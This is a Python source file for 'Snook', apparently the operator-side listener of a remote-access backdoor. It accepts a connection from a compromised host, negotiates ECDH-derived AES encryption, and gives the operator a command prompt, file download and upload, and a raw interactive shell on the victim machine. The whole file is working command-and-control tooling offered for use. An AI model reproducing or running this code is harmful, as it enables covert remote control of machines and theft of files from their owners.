#!/usr/bin/python3


from argparse import ArgumentParser
from base64 import b64decode, b64encode
from cmd import Cmd
from glob import glob
from json import dumps, JSONDecodeError, loads
import logging
import os
from os.path import abspath, getsize, isdir, join
from ntpath import basename
from readline import get_completer_delims, set_completer_delims
from select import select
from shlex import split
from socket import AF_INET, SHUT_RDWR, socket, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from struct import pack, unpack
from sys import stdin
import termios
from threading import Thread
from typing import Tuple

from alive_progress import alive_bar
from colorama import Fore, init
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, padding, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import algorithms, Cipher, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF


# TODO: encrypt command with on/off switch
# TODO: Add a command parameter on interactive command


# Little trick to enable correct path autocompletion on Unix
old_delims = get_completer_delims()
set_completer_delims(old_delims.replace('/', ''))

logger = logging.getLogger('Snook')

stop_interactive_mode=False


class Packet():

    def __init__(self):
        self.action = 'cmd'
        self._args = {}
        self.message = None
        self.warning = None
        self.error = None
        self.path = None

    def add_argument(self, name: str, value, base64_enc: bool=True) -> None:
        if isinstance(value, str) and base64_enc:
            value = b64encode(value.encode('utf-8')).decode('utf-8')
        self._args[name] = value

    def dumps(self) -> str:
        return dumps({'action': self.action, 'args': self._args})

    def get_argument(self, name: str):
        return self._args.get(name)

    @staticmethod
    def loads(data: str) -> 'Packet':
        p = Packet()
        data = loads(data)
        p.action = data.get('action', '')
        p._args = data.get('args', {})
        p.message = b64decode(data.get('message', '')).decode('utf-8')
        p.warning = b64decode(data.get('warning', '')).decode('utf-8')
        p.error = b64decode(data.get('error', '')).decode('utf-8')
        p.prompt = b64decode(data.get('prompt', '')).decode('utf-8')
        return p


def decrypt_data(data: bytes, key: bytes, iv: bytes) -> bytes:
    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv),
        backend=default_backend()).decryptor()
    decrypted = decryptor.update(data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(decrypted) + unpadder.finalize()


def encrypt_data(data: bytes, key: bytes) -> Tuple[bytes, bytes]:
    iv = os.urandom(16)
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv),
        backend=default_backend()).encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    return encryptor.update(padded_data) + encryptor.finalize(), iv


def interactive_mode_read(sock: socket, key: bytes=None) -> None:
    while True:
        if select([stdin], [], [])[0]:
            if stop_interactive_mode:
                break
            data = os.read(0, 1024)
            send_packet(sock, data, key)


def interactive_mode_write(sock: socket, key: bytes=None) -> None:
    global stop_interactive_mode

    while True:
        data = receive_packet(sock, key)
        if data[0] == 0xbb:
            stop_interactive_mode = True
            sock.send(b'\x00\x00\x00\x00')
            break
        os.write(1, data[1:])


def receive_packet_size(sock: socket) -> int:
    received_bytes = b''
    while len(received_bytes) < 4:
        received_bytes += sock.recv(4 - len(received_bytes))
    return unpack('>I', received_bytes)[0]


def receive_data(sock: socket, size: int) -> bytes:
    received_bytes = b''
    while len(received_bytes) < size:
        received_bytes += sock.recv(size - len(received_bytes))
    return received_bytes


def receive_packet(sock: socket, key: bytes=None) -> bytes:
    size = receive_packet_size(sock)
    if key:
        iv = receive_data(sock, 16)
    message = receive_data(sock, size)

    if key:
        message = decrypt_data(message, key, iv)

    return message


def send_packet(sock: socket, data: bytes, key: bytes=None) -> None:
    if key:
        data, iv = encrypt_data(data, key)
    size = pack('>I', len(data))

    sock.send(size)
    if key:
        sock.send(iv)
    sock.send(data)


class SilentArgumentParser(ArgumentParser):

    def error(message: str):
        self.exit(2)


class Prompt(Cmd):
    intro = ''
    prompt = ''

    def __init__(self, client_sock: socket, enable_encryption: bool):
        super().__init__()
        self.task_args = None
        self.sock = client_sock
        self.aes_key = None
        self.enable_encryption = enable_encryption
        self.features = ('download', 'interactive', 'upload')
        self.receive_packet()
        print('')

        
    def cmdloop(self, intro: str=None):
        while True:
            try:
                super().cmdloop(intro=intro)
                break
            except KeyboardInterrupt:
                print('^C')

    def complete_download(self, text: str, line: str, begidx: int, endidx: int) -> list:
        parser = SilentArgumentParser()
        parser.add_argument('file', nargs='?', type=str)
        parser.add_argument('-d', '--destination', type=str)

        try:
            args = parser.parse_args(self.split_line_for_completion(line[8:]))
        except SystemExit:
            return

        if args.destination and line.index(args.destination) != begidx:
            return

        path_to_complete = args.destination[:endidx - begidx]
        paths = glob(path_to_complete + '*')

        return paths

    def complete_upload(self, text: str, line: str, begidx: int, endidx: int) -> list:
        parser = SilentArgumentParser()
        parser.add_argument('file', type=str)
        parser.add_argument('-d', '--destination', type=str)

        try:
            args = parser.parse_args(self.split_line_for_completion(line[6:]))
        except SystemExit:
            return

        if args.file and line.index(args.file) != begidx:
            return

        path_to_complete = args.file[:endidx - begidx]
        paths = glob(path_to_complete + '*')

        return paths

    def default(self, line: str):
        logger.debug(f'Running command: {line}')
        p = Packet()
        p.add_argument('cmd', line)
        self.send_packet(p)
        return self.receive_packet()

    def do_download(self, line: str):
        parser = ArgumentParser(prog='download',
            description='Download file from remote host')
        parser.add_argument('file', type=str,
            help='Path to the file on the remote host')
        parser.add_argument('-d', '--destination', type=str, default='.',
            help='Destination of the downloaded file')
        try:
            args = parser.parse_args(split(line))
        except SystemExit:
            return

        if not line:
            parser.print_usage()
            return

        logger.debug(f'Running command: download {line}')

        self.task_args = args

        p = Packet()
        p.action = 'download'
        p.add_argument('path', args.file)
        self.send_packet(p)
        return self.receive_packet()

    def do_EOF(self, line: str):
        return self.do_exit('EOF')

    def do_exit(self, line: str=''):
        logger.debug(f'Running command: {line}')
        self.sock.shutdown(SHUT_RDWR)
        self.sock.close()
        return True

    def do_interactive(self, line: str):
        global stop_interactive_mode

        logger.debug('Running command: interactive')

        p = Packet()
        p.action = 'interactive'
        self.send_packet(p)

        # Put terminal into raw mode
        flags = termios.tcgetattr(stdin)
        flags_copy = flags[:]
        flags[3] = flags[3] & ~(termios.ECHO | termios.ICANON | termios.ISIG)
        termios.tcsetattr(stdin, termios.TCSAFLUSH, flags)
        
        stop_interactive_mode = False

        read_thread = Thread(target=interactive_mode_read,
            args=(self.sock, self.aes_key))
        write_thread = Thread(target=interactive_mode_write,
            args=(self.sock, self.aes_key))


        read_thread.start()
        write_thread.start()

        write_thread.join()

        # Set back terminal to cook mode
        termios.tcsetattr(stdin, termios.TCSAFLUSH, flags_copy)

    def do_upload(self, line: str):
        parser = ArgumentParser(prog='upload',
            description='Upload file to remote host')
        parser.add_argument('file', type=str,
            help='Path to the file to upload')
        parser.add_argument('-d', '--destination', type=str, default='.',
            help='Destination of the uploaded file')
        try:
            args = parser.parse_args(split(line))
        except SystemExit:
            return

        if not line:
            parser.print_usage()
            return

        self.task_args = args

        p = Packet()
        p.action = 'upload'

        try:
            p.add_argument('size', getsize(args.file))
        except OSError as e:
            self.print_error(str(e))
            return

        logger.debug(f'Running command: upload {line}')

        p.add_argument('dest', args.destination)
        p.add_argument('filename', basename(args.file))
        self.send_packet(p)
        return self.receive_packet()

    def generate_ecdh_key_pair(self) -> Tuple[ec.EllipticCurvePrivateKey,
                                              ec.EllipticCurvePublicKey]:
        private_key = ec.generate_private_key(ec.SECP384R1(), default_backend())
        return private_key, private_key.public_key()

    def generate_encryption_key(self, private_key: ec.EllipticCurvePrivateKey,
                                backdoor_public_key: ec.EllipticCurvePublicKey) -> bytes:
        shared_key = private_key.exchange(ec.ECDH(), backdoor_public_key)
        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=16,
            salt=None,
            info=b'',
            backend=default_backend()
        ).derive(shared_key.hex().encode())

        return derived_key

    def handle_default(self, packet: Packet):
        if packet.message:
            self.print_message(packet.message)
        if packet.warning:
            self.print_warning(packet.warning)
        if packet.error:
            self.print_error(packet.error)

    def handle_download(self, packet: Packet):
        if packet.error:
            self.print_error(packet.error)
            return

        file_size = packet.get_argument('size')
        received_bytes = 0
        
        if isdir(self.task_args.destination):
            file_path = join(self.task_args.destination,
                basename(self.task_args.file))
        else:
            file_path = self.task_args.destination

        with alive_bar(file_size) as bar:
            with open(file_path, 'wb') as f:
                while received_bytes < file_size:
                    data = receive_packet(self.sock, self.aes_key)
                    if not data:
                        return self.do_exit()

                    f.write(data)
                    received_bytes += len(data)
                    bar(incr=len(data))

        self.print_message(f'File successfully saved to {abspath(file_path)}')

    def handle_hello(self, packet: Packet):
        self.backdoor_features = packet.get_argument('features')
        backdoor_encryption = packet.get_argument('encryption')
        if not backdoor_encryption['supported']:
            self.print_warning('Communication encryption is not supported by the backdoor.')
            return

        if not backdoor_encryption['enabled']:
            self.print_warning('Communication encryption is disabled by the backdoor.')
            return

        res = Packet()
        res.action = 'hello'
        if self.enable_encryption:
            pr, pb = self.generate_ecdh_key_pair()
            pb_bytes = pb.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            encryption = {'enabled': True, 'pbkey': b64encode(pb_bytes).decode('utf-8')}
        else:
            encryption = {'enabled': False}
        res.add_argument('encryption', encryption)
        self.send_packet(res)

        if self.enable_encryption:
            backdoor_public_key = serialization.load_pem_public_key(
                b64decode(backdoor_encryption['pbkey']),
                backend=default_backend()
            )

            self.aes_key = self.generate_encryption_key(pr, backdoor_public_key)
            self.print_message('Communication encryption enabled.')
        else:
            self.print_warning('Communication encryption is disabled by the listener.')

    def handle_upload(self, packet: Packet):
        if packet.error:
            self.print_error(packet.error)
            return

        file_size = getsize(self.task_args.file)

        with alive_bar(file_size) as bar:
            with open(self.task_args.file, 'rb') as f:
                while True:
                    data = f.read(4096)
                    if not data:
                        break
                    self.send_data(data)
                    bar(incr=len(data))


        p = Packet.loads(receive_packet(self.sock, self.aes_key))

        self.print_message(f'File successfully uploaded to {p.message}')

    def onecmd(self, s: str):
        if s in self.features and s not in self.backdoor_features:
            self.print_message(f'{s} is not supported by the backdoor.')
            return False
        else:
            return super().onecmd(s)

    def remove_trailing_line_break(self, s: str) -> str:
        if s[-1] == '\n':
            s = s[:-1]
        return s

    def print_error(self, text: str) -> None:
        logger.error(Fore.RED + self.remove_trailing_line_break(text) + Fore.RESET)

    def print_message(self, text: str) -> None:
        logger.info(self.remove_trailing_line_break(text))

    def print_warning(self, text: str) -> None:
        logger.warning(Fore.YELLOW + self.remove_trailing_line_break(text) + Fore.RESET)

    def receive_packet(self):
        p = Packet.loads(receive_packet(self.sock, self.aes_key))

        try:
            f = getattr(self, 'handle_' + p.action)
        except AttributeError:
            f = getattr(self, 'handle_default')

        if p.prompt:
            self.prompt = f'{p.prompt} '

        return f(p)

    def send_data(self, data: bytes) -> None:
        send_packet(self.sock, data, self.aes_key)

    def send_packet(self, packet: Packet) -> None:
        send_packet(self.sock, packet.dumps().encode('utf-8'), self.aes_key)

    def split_line_for_completion(self, line: str) -> list:
        """ 
        Split a command line like a shell would do but still keep
        empty arguments (i.e. two spaces in a row) to enable autocompletion       
        """
        if not line.endswith('  '):
            line += ' '
        return split(line.replace('  ', ' "" '))


if __name__ == '__main__':
    parser = ArgumentParser(description='Listen for incoming connections')
    parser.add_argument('-H', '--host', type=str, default='0.0.0.0',
        help='Local hostname or IP address to bind to (default: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, default=1337,
        help='Local port to bind to (default: 1337)')
    parser.add_argument('-l', '--log', nargs='?', type=str,
        help='Path to the file where to log commands and outputs')
    parser.add_argument('-n', '--no-encryption', action='store_true',
        help="Disable communication's encryption with the backdoor")
    args = parser.parse_args()

    # Setup logger
    logger.setLevel(logging.DEBUG)

    consoleHandler = logging.StreamHandler()
    consoleHandler.setLevel(logging.INFO)
    consoleFormatter = logging.Formatter('%(message)s')
    consoleHandler.setFormatter(consoleFormatter)
    logger.addHandler(consoleHandler)

    if args.log:
        fileHandler = logging.FileHandler(args.log)
        fileHandler.setLevel(logging.DEBUG)
        fileFormatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s')
        fileHandler.setFormatter(fileFormatter)
        logger.addHandler(fileHandler)

    init()  # colorama

    sock = socket(AF_INET, SOCK_STREAM)

    try:
        # Setup socket
        sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        server_address = (args.host, args.port)
        sock.bind(server_address)
        sock.listen()
        logger.info(f'Listening on {server_address[0]}:{server_address[1]}')
        client_socket, client_address = sock.accept()

        logger.info(f'Received connection from {client_address[0]}:{client_address[1]}')
        prompt = Prompt(client_socket, not args.no_encryption)
        prompt.cmdloop()
    except Exception as e:
        logger.exception(e)
        client_socket.shutdown(SHUT_RDWR)
        client_socket.close()
        raise
    finally:
        sock.shutdown(SHUT_RDWR)
        sock.close()
